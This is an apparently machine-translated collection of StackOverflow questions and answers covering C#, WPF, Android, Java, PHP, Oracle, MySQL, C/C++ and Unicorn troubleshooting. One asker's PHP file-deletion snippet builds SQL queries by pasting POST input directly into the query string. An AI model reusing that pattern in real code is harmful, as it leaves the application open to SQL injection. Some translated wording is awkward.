* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-14T22:29:50.163

我想你理解了这个概念。

依赖注入的基本思想是将对象的实例化委托给框架。

您可以编写自己的容器，但我建议您使用框架。

大多数框架允许您决定应该注入哪些类型以及应该在哪里注入它们。

[Symfony](https://github.com/symfony/DependencyInjection)是一个非常好的容器。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-11-10T06:40:49.910

关于容器的整个想法是解决依赖关系并执行对象的初始化。

我会做：选择你的容器。为了好玩，我写了一个在多个应用程序中使用。（[https://github.com/niclaslindberg/webx-ioc/](https://github.com/niclaslindberg/webx-ioc/)）。使用接口设计依赖项。（只允许类依赖于其他接口）。注册你的类/实例，让容器做所有的脏活。

# c# - MonoTouch 神秘地不编译方法和属性？

> ID：10148562
> 
> 赞同：0
> 
> 时间：2012-04-13T21:29:46.397
> 
> 标签：c#, xamarin.ios, jit, aot

我有一个奇怪的问题，MonoTouch 似乎要么没有编译方法，要么找不到它被指示调用的已编译方法，并且仅在发布配置中的设备上 - 调试版本很好。我尝试使用更简单的代码示例重现它，但没有成功，所以我怀疑您是否能够使用下面的代码看到行为。但这本质上就是我正在做的事情：

```
using System;
using MonoTouch.UIKit;

public class MyClass
{
    private UINavigationController _navController;
    private UIViewControler _viewController;

    public UINavigationController NavController
    {
        get
        {
            if (_navController == null)
            {
                if (_viewController == null)
                {
                    _viewController = new UIViewController();
                }
                _navController = new UINavigationController(_viewController);
            }
            return _navController;
        }
    }
} 
```

然后，用其他方法...

```
public void SomeMethod()
{
    MyClass myClass = new MyClass();
    var navController = myClass.NavController; // <-- This is where it throws
} 
```

我得到的例外是标准的 JIT 编译消息，说它试图 JIT get_NavController()。我觉得这很奇怪，因为没有虚拟泛型，没有 LINQ，链接器已关闭，而且似乎没有其他任何通常会导致 JIT 的问题。我还验证了它会抛出 MyClass 上定义的其他方法和属性，但不会抛出构造函数或`System.Object`继承的方法。反射显示，`myClass.GetType().GetMembers()`对于我所期望的一切，都有一个 MemberInfo。然而，*仅对于 Release|iPhone*，我无法访问这些方法或属性。我能得出的唯一合乎逻辑的结论是 aot 编译步骤缺少它们，我根本不知道为什么会发生这种情况，更不用说仅在 Release 配置中。

我的问题是，什么可能导致这种情况，以及修复它的下一步是什么？我什至不知道从哪里开始调试这个，或者提交一个关于什么的错误，因为我无法在我们（很多）更大的项目的上下文中重现它。

**更新：**请求了确切的异常文本。

```
System.ExecutionException: Attempting to JIT compile method
'MyNamespace.MyClass.get_NavController ()' while running with --aot-only 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T22:13:50.480

这看起来不是可以在这里解决的问题。

如果您无法制作更小的测试用例，我建议您提交一个错误，并附上整个项目。如果您不希望您的项目公开可见，您可以提交只有 Xamarin 员工有权访问的私有错误。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-16T17:25:16.230

你能尝试显式声明变量吗

```
UINavigationController navController = myClass.NavController; 
```

或者，我想知道这是否与需要等待 UIViewController.ViewDidLoad 方法被调用有关，因为类的内部可能尚未初始化？

只是在这里在黑暗中拍摄，我想不出你的代码不起作用的原因。

# wpf - 我应该如何在 WPF 中实现非基于事件的操作？

> ID：10148569
> 
> 赞同：4
> 
> 时间：2012-04-13T21:30:56.493
> 
> 标签：wpf, wpf-4.0

我有几年的循环游戏编程背景。我非常习惯在我的应用程序中有一个恒定循环，它不断调用像 Update 和 Draw 这样的函数，允许我通过每帧增加一点值来随着时间的推移执行动画等动作。

不过，现在我找到了一份涉及 WPF 的工作，我发现我太依赖那个系统了。也许我对 WPF 的感觉有限，但似乎一切都是基于事件的。用户单击一个按钮，您通知代码，代码操作值。值改变，代码通知 UI，UI 更新布局。它适用于基于 GUI 的应用程序编程，但我发现当我遇到在基于循环的游戏编程中微不足道的情况时，我会陷入困境，无法找到实现简单行为的好方法。

冒着过于模糊的风险，我将以我当前的问题为例。在 Windows 8 发布后，我对 Semantic Zoom 的想法非常着迷。在广泛使用开始屏幕后，我开始为 Microsoft Surface 开发一个将语义缩放到 WPF4.0 的端口（我在工作中使用 Surface）。我只想要一个简单的例子，它可以让我使用捏合手势在一堆视图中上下导航。

在花了几个小时试图理解操作事件之后（我不会进入那个...... bleh），我终于得到了基于捏合手势的视图缩放。如果它超过某个点，我会跳回“缩小”视图。很酷。但是，问题是，如果用户没有完成手势并决定不缩小，我会得到一个较小的视图。我想为视图的比例设置动画，使其从用户捏合中不断“反弹”并恢复到 1 的比例。我知道这是否是基于循环的，我只会将 Lerp 朝向每帧 1。但是由于 WPF 都是基于事件的，所以我有点迷茫。

使用惯性或不同的操作事件可能会解决这个特定问题（我很高兴听到它），但除此之外，我只想知道如何重新定位我的思维定势，以便在 WPF 中更有效地工作. 仅仅是知道要订阅哪些事件吗？有没有聪明的方法来使用动画来做我想做的事？我应该使用线程来完成这些类型的任务，还是作弊（这似乎不可靠，而且我对 WPF 中的线程感到不安）？

我认为，这个问题是我在 WPF 中有效的最大障碍之一（嗯，这个问题还不太了解 MVVM，正在研究那个）。我希望看到它被拆除，并且能够在不仅仅是基于循环的游戏编程中发挥作用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-13T22:02:54.870

虽然我很确定您想要做的大部分事情都可以以基于事件的方式完成，但您可能想看看 MSDN [How to: Render on a Per Frame Interval Using CompositionTarget](http://msdn.microsoft.com/en-us/library/ms748838.aspx)。另请注意最后一节*Per-Frame Animation: Bypass the Animation and Timing System* in [Property Animation Techniques Overview](http://msdn.microsoft.com/en-us/library/aa970492.aspx)。

# java - 有人可以帮我提供Android开发登录密码吗？

> ID：10148572
> 
> 赞同：0
> 
> 时间：2012-04-13T21:31:35.880
> 
> 标签：java, android

嗨，我是 android 开发的新手，我遇到了错误，我在记事本中创建了 php 文件并在最后设置了 .php。用户界面运行良好，仅当我单击登录或注册按钮时它强制关闭帮助

我得到的错误日志是

> ```
> 04-13 12:18:25.811: W/System.err(349): java.net.SocketException: Permission denied 
> 04-13 12:18:25.811: W/System.err(349): 
> at org.apache.harmony.luni.platform.OSNetworkSystem.createStreamSocketImpl(Native Method)
> 04-13 12:18:25.811: W/System.err(349): 
> at org.apache.harmony.luni.platform.OSNetworkSystem.createStreamSocke(OSNetworkSystem.java:186)
> 04-13 12:18:25.811: W/System.err(349): 
> at org.apache.harmony.luni.net.PlainSocketImpl.create(PlainSocketImpl.java:265)
> 04-13 12:18:25.811: W/System.err(349): 
> at java.net.Socket.checkClosedAndCreate(Socket.java:873)
> 04-13 12:18:25.811: W/System.err(349): 
> ```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-13T23:29:09.443

usespermission 行可能在清单文件中的位置错误。确保它在清单标签下，如下所示：

```
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.test"
    android:versionCode="5"
    android:versionName="1.0" >

    <uses-permission android:name="android.permission.INTERNET" /> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-13T21:33:38.510

看起来您需要`INTERNET`在清单中添加权限。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-13T23:32:36.370

看起来您的清单配置不正确...

他是可以帮助你的东西

[安全和清单 - Android -](http://developer.android.com/guide/topics/security/security.html)

```
...
<uses-permission android:name="android.permission.INTERNET" />
... 
```

您几乎只需将上述行添加到您的清单中，它应该可以工作。请务必查看链接以获取更多说明！

问候， 厄瓦尔德

# java - 如何在输出后将我的用户输入保持在同一行？

> ID：10148573
> 
> 赞同：10
> 
> 时间：2012-04-13T21:31:38.207
> 
> 标签：java, new-operator

我正在尝试编写询问用户年龄然后他们输入的代码，但我希望数字在您输入后出现在问题旁边。

我的代码如下所示：

```
System.out.println("Enter a number: ");
num1 = userIn.nextInt(); 
```

它工作正常，但数字总是出现在下面的行上。

**输出：**

```
Enter a number:
12 
```

**我想要的是：**

```
Enter a number: 12 
```

有什么建议么？

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2012-04-13T21:32:50.533

使用`print()`代替`println()`;

`System.out.println()`自动添加换行符。那是什么`ln`意思。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-04-13T21:32:48.760

`System.out.print`而不是`println`.

println 在打印输出后添加一个换行符， print 只会打印您的消息。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-13T21:33:33.853

因为您使用which在输出后`System.out.println`添加了一个换行符 ( )。`\n`改为使用`System.out.print`。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2017-02-13T04:29:22.390

使用`System.out.print()`而不是`println`. **在传递参数内部的参数**`Println`后添加一个新行。

# php - 如何从 TXT 文件中提取 Open Graph 信息？

> ID：10148575
> 
> 赞同：0
> 
> 时间：2012-04-13T21:31:49.533
> 
> 标签：php, json, parsing, text-files

我有一个 TXT 文件，其中包含一些 facebook Open Graph 信息，如下所示：

```
{
    "data": [
      {
        "name": "Avatar", 
        "category": "Movie", 
        "id": "82771544063", 
        "created_time": "2012-04-13T21:16:56+0000"
      }, 
      {
        "name": "HappyDance", 
        "category": "Movie", 
        "id": "243564344063", 
        "created_time": "2012-04-13T21:16:56+0000"
      } 
    ], 
    "paging": {
        "next": "https://graph.facebook.com/me/likes?format=json&limit=5000&offset=5000&__after_id=5546653546361"
    }
} 
```

在 PHP 中，我想从显示的行中提取所有 id 号

```
"id": "XXXXXXXXXXXX", 
```

输出应如下所示：

```
I like 8277564344063
I like 243564344063 
```

我开始了以下操作，但出现错误：

```
<?php
$file_handle = fopen("raw.txt", "rb");
ob_start();

$text = file_get_contents('raw.txt');
$decode = json_decode($text);

print_r($decode);

$new_content = ob_get_clean();
file_put_contents("likes.txt", $new_content);

fclose($file_handle);
?> 
```

错误是我的输出是空白的！我究竟做错了什么？

请帮忙？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-13T23:51:05.260

您没有有效的 JSON。

此行下方的 JSON**对象**是有效的 JSON。我在“数据”数组中的最后一个关联数组之后删除了逗号。数组末尾不需要逗号。

```
 {
            "data": [
              {
                "name": "Avatar", 
                "category": "Movie", 
                "id": "82771544063", 
                "created_time": "2012-04-13T21:16:56+0000"
              }, 
              {
                "name": "HappyDance", 
                "category": "Movie", 
                "id": "243564344063", 
                "created_time": "2012-04-13T21:16:56+0000"
              }
            ], 
            "paging": {
                "next": "https://graph.facebook.com/me/likes? format=json&limit=5000&offset=5000&__after_id=5546653546361"
            }
        }

Parse error on line 14:
...    },            ],    "paging": { 
---------------------^
Expecting 'STRING', 'NUMBER', 'NULL', 'TRUE', 'FALSE', '{', '[' 
```

当我从无效的 JSON 中删除逗号时。我能够得到你想要的结果。

```
 <?php
                $json_object = file_get_contents('fb.json');
                if(!$json_object) {
                                      echo "oops, cant read the file";
                                    }

                 // remap json_object
                 $json_object = json_decode($json_object,true);

                    foreach($json_object['data'] as $item) {
                            $items[] = "I like" . ' ' . $item['id'];

                      /* If you want to just echo " I like xyz" etc
                       * use echo "I like" . $item['id'];
                       */
                        }

                  $list = implode(',',$items);

                  echo $list;
            ?> 
```

# oracle - 为什么我的光标只返回第一行？

> ID：10148577
> 
> 赞同：2
> 
> 时间：2012-04-13T21:32:08.957
> 
> 标签：oracle

你好我有点困惑，我在这个函数中的光标只返回第一行。

我一直在将它与我见过的几个不同的例子进行比较，我只是看不出有什么问题。非常感谢任何指导。

```
FUNCTION FS_A_FUNCTION
(
    inDate DATE
)
RETURN VARCHAR2 IS

tAnswer     VARCHAR2(1)  := 'N';
tDates DATE;

CURSOR c1 IS

SELECT S.Dates FROM A_TABLE S;

BEGIN 
OPEN c1;
LOOP
    FETCH c1 INTO tDates;
    EXIT WHEN c1%NOTFOUND;
END LOOP;
CLOSE c1;

IF inDate IN (tDates) THEN
tAnswer := 'Y';

END IF;

RETURN (tAnswer);

END FS_A_FUNCTION 
```

提前致谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-13T21:40:31.557

不太确定你期望发生什么。在您的循环之后`tDates`，游标最后看到的任何一行都会有一个值。由于您`select`没有`order by`，这可能是您表中的任何值。我认为您可能意味着要检查`inDate`循环内部的值。

我不确定你为什么要使用游标，除非真正的逻辑更复杂。如果你按照我的想法做，你可以这样做：

```
FUNCTION FS_A_FUNCTION
(
    inDate DATE
)
RETURN VARCHAR2 IS
    tAnswer VARCHAR2(1);
BEGIN
    select decode(max(dates), null, 'N', 'Y')
    into tAnswer
    from a_table
    where dates = inDate;

    RETURN tAnswer;
END FS_A_FUNCTION; 
```

...或者也许更清楚一些相同的逻辑：

```
FUNCTION FS_A_FUNCTION
(
    inDate DATE
)
RETURN VARCHAR2 IS
    tDates DATE;
BEGIN
    select max(dates)
    into tDates
    from a_table
    where dates = inDate;

    IF tDates IS NULL THEN
        RETURN 'N';
    ELSE
        RETURN 'Y';
    END IF;
END FS_A_FUNCTION; 
```

在这两种情况下，我都会使用`max()`以防多行具有相同的日期。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-13T21:41:05.190

您正在测试表`inDate`的字段中是否存在`dates`，但仅在循环结束后，因此引用`tDates`将是查询的最后一条记录。

您可以通过简单地检查是否存在带有日期的记录来做到这一点：

```
cursor c1 is
  select *
    from A_TABLE
   where Dates = inDate; 
```

如您所见，无需循环。

# php - 文件不会使用取消链接删除

> ID：10148578
> 
> 赞同：1
> 
> 时间：2012-04-13T21:32:08.953
> 
> 标签：php, mysql, delete-file, unlink

下面的文件应该删除存储在文件夹中的文件和与该文件相关的数据库行。数据库行删除工作正常，但我无法让文件删除工作。doc_link 是一个表列，存储图像的相对路径。任何帮助将不胜感激。

**编码**

```
$delete = $_POST['checkbox'];

foreach ($delete as $id => $val) {
    //Get file path stored in table and delete file
    $relpath="SELECT doc_link FROM documents WHERE id = '".$id."'";
    $pathresult= mysqli_query($con, $relpath) or die("Invalid query");
    unlink($pathresult);

    //Deletes row from table
    $query="DELETE FROM documents WHERE id = '".$id."'";
    $result= mysqli_query($con, $query) or die("Invalid query"); 
}

//Show that the items have been successfully removed.//
if (mysqli_affected_rows($con) > 0) {
echo '<p>The selected items have been successfully deleted.</p>';
} else {
echo '<p>An error has occurred while processing your request</p>';
}
?> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-13T21:35:41.010

您不能只是运行`mysql_query()`并期望它返回该值`doc_link`。您还必须运行`mysqli_fetch_array()`以**获取**该行，然后通过`$row['doc_link']`. `$pathresult`是 MySQL 资源，而不是文件的（字符串）路径。

# android - 蓝牙插座

> ID：10148581
> 
> 赞同：2
> 
> 时间：2012-04-13T21:32:14.710
> 
> 标签：android, bluetooth

我正在为两个玩家构建tic tac，需要蓝牙连接来交换一些数据，我可以启用蓝牙，启用发现能力，但我在“BluetoothServerSocket”和客户端“BluetoothSocket”中的问题，我不知道如何操作这部分，这是代码：

```
ArrayList<String>al=new ArrayList<String>();
        BluetoothAdapter ba = BluetoothAdapter.getDefaultAdapter();
        Set<BluetoothDevice> pairedDevices = ba.getBondedDevices();

        if(pairedDevices.size()>0)  
            for(BluetoothDevice d: pairedDevices)
                al.add(d.getName()+" , "+d.getAddress());

                    if (!ba.isEnabled()) 
                       ba.enable();

                    BluetoothDevice device;
                    Intent dis=new Intent(BluetoothAdapter.ACTION_REQUEST_DISCOVERABLE);
                    dis.putExtra(BluetoothAdapter.EXTRA_DISCOVERABLE_DURATION,300);
                    startActivity(dis);

                    BluetoothSocket socket = device.createRfcommSocketToServiceRecord(UUID);
                    socket.connect();

                    InputStream is=socket.getInputStream();
                    OutputStream os=socket.getOutputStream(); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T22:46:48.203

两个播放器都将通过“BluetoothSocket”进行通信，您可以使用 InputStreams 和 OutputStreams 发送/接收数据。但是要获得这样一对套接字，您可以这样做：

在一个播放器的一侧创建 BluetoothServerSocket，另一个连接到它。BluetoothServerSocket 使用 'accept' 方法侦听连接，该方法会阻塞直到客户端 BluetoothSocket 连接到它。之后，BluetoothServerSocket.accept() 方法返回一个 BluetoothSocket，它可以与客户端 Btsocket 一起用于 2 路信息传输。

希望这可以帮助...

PS：createRfcommSocketToServiceRecord 只是创建了上面提到的一个这样的客户端。您可以为双方使用相同的 UUID

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-02-05T10:32:44.117

看来您在数据交换方面遗漏了很多复杂性。主要是你需要处理线程来监听/发送数据。在这里，您可以完整地实现我所说的内容：[https ://github.com/buddles/AndBT/blob/master/AndBT/src/br/pucrs/tcii/BluetoothService.java](https://github.com/buddles/AndBT/blob/master/AndBT/src/br/pucrs/tcii/BluetoothService.java)

您是否考虑过使用已经实现的库？这个项目带有一个井字游戏示例和一个最多支持七个连接的聊天应用程序：[https ://github.com/buddles/AndBT](https://github.com/buddles/AndBT)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-03-14T11:12:08.100

你可以参考这个[链接](https://android.googlesource.com/platform/development/+/25b6aed7b2e01ce7bdc0dfa1a79eaf009ad178fe/samples/BluetoothChat)。这是一个简单的蓝牙聊天应用程序。您可以修改此应用程序以发送和接收所需的数据。

# ruby-on-rails - 独角兽没有用 USR2 重新加载

> ID：10148588
> 
> 赞同：7
> 
> 时间：2012-04-13T21:32:56.470
> 
> 标签：ruby-on-rails, ruby-on-rails-3, unicorn

我正在尝试使用 USR2 信号重新加载独角兽，但在日志中出现以下错误：

```
E, [2012-04-13T21:27:00.801192 #24474] ERROR -- : old PID:23820 running with existing pid=/home/user/app.git/tmp/unicorn.pid.oldbin, refusing rexec 
```

我已经搜索了互联网，但没有任何线索。似乎独角兽正在尝试写入 pid 文件？我正在发布一个`kill -s USR2 PID`

谢谢

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-18T23:28:48.020

我今天遇到了这个。我假设您之前已将 USR2 发送给 unicorn，现在这是您第二次尝试这样做。

根据[关于信号和 USR2 的独角兽文档](http://unicorn.bogomips.org/SIGNALS.html)：“一旦验证子进程已启动并运行，则应将单独的 QUIT 发送到原始进程。”

在这种特殊情况下，您将传递旧的 PID 来杀死

```
kill -s QUIT 23820 
```

或者，您可以利用这个旧 PID 与“当前”PID 一起存储一个已知文件（在错误消息中引用）这一事实，并执行：

```
kill -s QUIT `cat /home/user/app.git/tmp/unicorn.pid.oldbin` 
```

# php - 无法使用带有密码的 mysql_connect 连接到 mysql 5.0.8

> ID：10148590
> 
> 赞同：3
> 
> 时间：2012-04-13T21:33:08.210
> 
> 标签：php, mysql, sql, phpmyadmin, mysqli

我可以在没有密码的情况下使用 php 连接到我的 mysql 数据库。但是，当我在 phpmyadmin 中添加密码时，我无法再连接。我一直得到以下错误：

```
"Could not connect: Access denied for user 'admin'@'localhost' (using password: YES)" 
```

我尝试使用 MySQL 密码 4.0 和 4.1+ 的两种设置，结果相同。

```
mysql_connect ("127.0.0.1", "admin", "password") or  die('Could not connect: ' . mysql_error());;
mysql_select_db ("datatable"); 
```

有谁知道这里可能发生了什么？

编辑：如果我关闭密码，我可以访问它。好像有什么误会

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T22:20:04.510

这可能会有所帮助

脚步-

1.  去phpmyadmin；
2.  单击要更改密码的数据库（左侧）；
3.  点击“特权”；
4.  单击 localhost 的 root 用户右侧的“编辑权限”图标。
5.  转到“更改密码”块；
6.  勾选“密码”单选按钮；
7.  输入密码并重新输入该密码；
8.  滴答：……保留旧的。
9.  点击“前往”；
10.  现在从 WAMPSERVER 菜单打开一个 MySql 控制台；
11.  它会要求您输入密码——只需点击返回，因为您还没有密码（下次您进入控制台时，您需要输入您在此处输入的新密码）。键入以下内容：

    UPDATE mysql.user SET Password=PASSWORD("xxxxxx") WHERE User="root"; （其中 xxxxxx 是您在上一步中输入的密码）。

12.  现在输入：FLUSH PRIVILEGES；

13.  转到您的 WAMP 或 MAMP 文件夹，找到 APPS 文件夹，然后单击您的 PHPMYADMIN 文件夹（例如我的名为 phpmyadmin2.11.6 的文件夹）并找到 config.inc.php

14.  使用写字板打开 config.inc.php 并找到以下文本：

`$cfg['Servers'][$i]['password'] = '';`

现在添加您在第 3 步中使用的密码，如下所示：

`$cfg['Servers'][$i]['password'] = 'yourPasswordHere';`

1.  现在保存此修改，并关闭 config.inc.php

你现在应该准备好了！

来源 - [http://www.knowledgesutra.com/discuss/tsilti-php-myadmin-access-mysql-database.html](http://www.knowledgesutra.com/discuss/tsilti-php-myadmin-access-mysql-database.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-13T21:38:46.317

根据您显示的 mysql_connect 语句，您正在尝试以`admin@'127.0.0.1'`. 这需要使用 TCP/IP 连接到 mysql。如果按此方式连接，`admin@localhost`则使用 mysql.sock（套接字文件）连接到 mysqld。

您应该运行此查询

```
SELECT user,host,password FROM mysql.user WHERE user='admin'; 
```

您应该看到`admin@localhost`已定义。你可能不会看到`admin@'127.0.0.1'`。您可以添加它，但只为`admin@localhost`.

尝试按如下方式更改您的代码：

```
mysql_connect ("localhost", "admin", "password") or  die('Could not connect: ' . mysql_error());;
mysql_select_db ("datatable"); 
```

如果你不用密码也能连接mysql，那么你的mysql安装就不安全了。

您需要为 admin@localhost 添加密码并删除匿名用户登录，如下所示：

```
UPDATE mysql.user SET password=password('whateverpassword')
where user='admin' and host='localhost';
DELETE FROM mysql.user WHERE user='';
FLUSH PRIVILEGES; 
```

这是另一个建议：像这样创建 admin@127.0.0.1 用户：

```
GRANT ALL PRIVILEGES ON *.* TO admin@'127.0.0.1' IDENTIFIED BY 'whateverpassword'; 
```

并尝试您的原始代码

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-13T22:09:56.630

如果您通过 phpMyAdmin 篡改 MySQL 用户数据，您必须执行

```
FLUSH PRIVILEGES 
```

命令以使新规则适用。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-13T21:34:16.847

您的用户名或密码不正确。确保您输入正确，没有留下尾随空格。用户名和密码区分大小写。

# c - 使 Visual Studio 对无符号比较发出警告

> ID：10148591
> 
> 赞同：0
> 
> 时间：2012-04-13T21:33:12.713
> 
> 标签：c, visual-studio

此代码在使用 Visual Studio 2010 编译时

```
#include <cstdlib>
#include <cstdio>

int numbers[] = { 23, 24, 25, 25, 28, 20, 20 };

int main(void) {
    int d = -1, x=0;
    size_t count = sizeof(numbers) / sizeof(numbers[0]);

    if (d <= (sizeof(numbers) / sizeof(numbers[0]))-2)
        x = numbers[d+1];

    if (d <= count-2)
        x = numbers[d+1];
} 
```

给我一个有符号/无符号不匹配警告 on`if (d <= count-2)`但不是 on `if (d <= (sizeof(numbers) / sizeof(numbers[0]))-2)`。为什么是这样？我已启用*所有*警告。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T23:07:15.620

在这种情况下，Visual C++ 编译器不会发出警告 C4018 是一个错误。请参阅 Microsoft Connect 错误报告[“警告 C4018（有符号/无符号不匹配）对于 sizeof 运算符”。](http://connect.microsoft.com/VisualStudio/feedback/details/569898/warning-c4018-signed-unsigned-mismatch-for-sizeof-operator)

该问题似乎仅与`sizeof`. 在比较中涉及无符号类型的常量值的其他情况下，编译器也无法发出警告。例如，如果您将-qualification 添加`const`到`count`，即使在您的第二次比较中也不会发出 C4018。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-13T21:35:19.843

My guess is that it treats `2` as an int so promotes `(sizeof(numbers) / sizeof(numbers[0]))-2)` to an int because of the brackets and so the comaprison is `int < int`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-13T21:38:23.533

`size_t`被定义为无符号，所以你得到一个有符号的无符号冲突。

请注意，正如`sizeof`在编译时评估的那样，并被一个常量值替换，它不会抱怨符号不匹配，但在另一个表达式中，您将值显式转换为 size_t 变量，当您尝试时可能会溢出与带符号的数字进行比较。

# javascript - 防止 WebSQL 数据库中的 SQL 注入？（如何处理数据中的引号？）

> ID：10148599
> 
> 赞同：4
> 
> 时间：2012-04-13T21:34:01.013
> 
> 标签：javascript, webkit, sql-injection, web-sql

我目前正在将 mysql 数据库的 xml 导出导入 websql 数据库，以用于在线移动体验。

一切正常，花花公子，直到我插入的任何字符串中都有双引号。通常，在 PHP 中，我会在插入时使用类似：mysql_real_escape_string。

我知道我可以尝试的选项是编写正则表达式并制作用于添加/删除斜杠的函数。谷歌上有很多例子 - 但我希望看到的是其他人是否遇到过这个问题，并且可能有更好的解决方案。

谢谢你的帮助！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-29T16:55:16.030

Forget about escaping. Do the right thing: use placeholders. In this case data will never ever be treated as anything but raw data string. In Web SQL this can be done with [`executeSql`](http://www.w3.org/TR/webdatabase/#executing-sql-statements). See [pre-processing section](http://www.w3.org/TR/webdatabase/#preprocess-the-sql-statement) on explanation on how this works.

Example straight from intro of document:

```
db.readTransaction(function (t) {
  t.executeSql('SELECT title, author FROM docs WHERE id=?', [id], function (t, data) {
    report(data.rows[0].title, data.rows[0].author);
  });
}); 
```

No matter what is in `id` variable, this request will look for verbatim value, never being interpreted as part of command.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-29T16:45:29.697

一个简单的解决方法是使用 AJAX 请求将 XML 字符串发送到 PHP，PHP 将返回带有转义引号的字符串。

# c++ - 头文件中的空类声明？

> ID：10148605
> 
> 赞同：5
> 
> 时间：2012-04-13T21:34:33.177
> 
> 标签：c++, class, header-files

> **可能重复：**
> [什么是 C++ 中的前向声明？](https://stackoverflow.com/questions/4926105/what-is-forward-declaration-in-c)

我只是对这个简单示例中的一段代码在做什么有疑问。我查找了朋友类并了解它们是如何工作的，但我不明白顶部的类声明实际上在做什么（即机器人）。这是否只是意味着 Happy 类可以使用 Robot 对象，但他们不能访问其私有部分，任何信息都将不胜感激。

```
#include <stdlib.h>
#include <stdexcept>

template <typename T>   // What is this called when included 
class Robot;            // is there a special name for defining a class in this way

template <typename T>
class Happy
{ 
  friend class Joe<T>;  
  friend class Robot<Happy<T> >;
  // ...
}; 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-13T21:37:53.770

这是一个**前向声明**。

它只是在那里通知编译器一个名为的类模板`Robot`将在稍后定义，并且它应该期望该定义。

同时（即直到`Robot`正式定义），它允许程序员在代码中引用该类型。在您给出的示例中，有必要声明`Robot`为类`friend`的a `Happy`。（谁取了这些名字？！）

这是避免循环依赖和最小化编译时间/开销的常用策略。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-13T21:38:54.473

它基本上对其余代码说“您可以使用它，但我稍后会声明它”。如果没有该行，这段代码将无法编译： `friend class Robot<Happy<T> >;`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-13T21:40:08.543

它被称为前向声明——它基本上是对编译器说的；“相信我，我将使用稍后定义的类”。但是因为编译器对机器人的成员一无所知，所以你只能在这里以只有一个指针（或引用）指向它的方式使用它。

这是因为否则您需要在此标头中包含 Robot 标头，这可能会导致其他循环依赖。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-13T21:40:27.280

这就是所谓的“前向声明”。您是在告诉编译器“有一个名为`Robot`. 的类。我没有解释它的外观，但请注意它的存在”。这样，当编译器看到你`Robot`在定义中使用`Happy`. 但是，您仍然必须在某个地方包含完整的定义`Robot`，否则最终会出现链接器错误。

当一个对象需要引用在 .h 文件中定义得更远的东西时，或者当两个对象需要相互引用时，您通常会看到这种用法。

# java - 有很多空对象会耗尽内存吗？如果是这样，是否有替代使用 ArrayDeque 作为队列的方法？

> ID：10148606
> 
> 赞同：2
> 
> 时间：2012-04-13T21:34:37.223
> 
> 标签：java, memory, queue

我是一个 n00b，所以很抱歉，如果我不同意这个，但我使用 arraydeque 作为一些线程处理的队列。每个线程处理队列中的一个项目（每个线程检查队列中是否有数据，如果有，则执行 queue.poll()，如果它很好，则将其发送到解决方案队列中，否则数据将被丢弃或其中一部分被送回队列进行进一步处理。

这是我的问题，我的程序运行的时间越长，它使用的内存就越多，最终我得到内存不足的错误（但在这种情况发生之前它会保持一段时间）。我正在学习 java，所以我不确定我是否正确识别了这一点，但我在我的代码上运行了 yourkit，它说：

```
Find arrays with big number of 'null' elements.
Problem: Possible memory waste.
Possible solution: Use alternate data structures e.g. maps or rework algorithms. 
```

yourkit 还向我展示了我 93% 的内存卡在此处（在堆转储中）。昨天我问了一个关于 arraydeque.polling() 可能是内存猪的问题，并得到评论说这不是因为我的数据在轮询后变成了“空”。

所以我的两个问题（如我的标题）是有一个不断增长的空对象的问题（我不确定它们是否得到了 GC，但由于堆转储中有几百万，我怀疑可能不是）？如果是这样，是否有 ArrayDeque 的替代品，也许是 GC 的项目不再需要时的东西（我的程序不断处理并在队列中添加项目，但即使要处理的项目数量减少了内存消耗也不会消失下来，当程序完成时突然变为零，如果队列逐渐建立，我希望它会逐渐变小）？

另一个稍微相关的问题，我正在处理由线程处理的队列中的数十亿个项目，但内存导致它失败。尝试改进我的内部程序队列有什么意义，还是使用真正的队列程序（如（rabbitmq 或 activemq）更有意义？（我真的是编程新手，所以不确定我什么时候达到了一个限制）工具以及如何改进它或弄清楚下一步要使用什么）

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-13T21:50:21.710

看起来这个`ArrayDeque`实现永远不会缩小它的内部数组，所以它只会永远增长。当从双端队列轮询一个对象时，其对应的数组元素设置为`null`，并且该对象最终将被垃圾回收（如果对它的所有其他引用也消失了）。但是内部数组`ArrayDeque`只是不断增长。

该`Deque`接口也由`LinkedList`and实现`ConcurrentLinkedDeque`，因此您最好使用其中之一。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-13T21:57:59.500

`ArrayDeque`借助两个“*指针*” - 头和尾，将项目存储在平面数组中。如果队列中的元素总数超过此数组的当前大小，则其大小加倍。

